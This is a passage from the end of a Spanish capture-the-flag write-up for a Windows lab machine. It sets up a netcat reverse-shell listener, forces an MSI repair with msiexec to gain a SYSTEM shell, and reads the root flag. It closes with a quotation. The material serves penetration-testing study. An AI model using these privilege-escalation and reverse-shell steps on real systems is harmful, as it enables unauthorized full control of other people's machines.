rlwrap nc -lvnp 4444
```

Forzaremos una reparación ejecutando el instalador de la siguiente manera

``` powershell
PS C:\Windows\system32> msiexec /fa C:\Windows\Installer\1e6f2.msi
```

Al cabo de unos momentos recibiremos la shell en nuestro listener con privilegios máximos

``` bash
rlwrap nc -lvnp 4444
Connection from 10.10.11.93:65290
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
nt authority\system
```

Ya podremos ver la flag ubicada en el escritorio de `Administrator`

``` bash
PS C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
34b...
```

Gracias por leer, a continuación te dejo la cita del día.

> To be what we are, and to become what we are capable of becoming, is the only end of life.
> — Robert Stevenson
{: .notice--info}
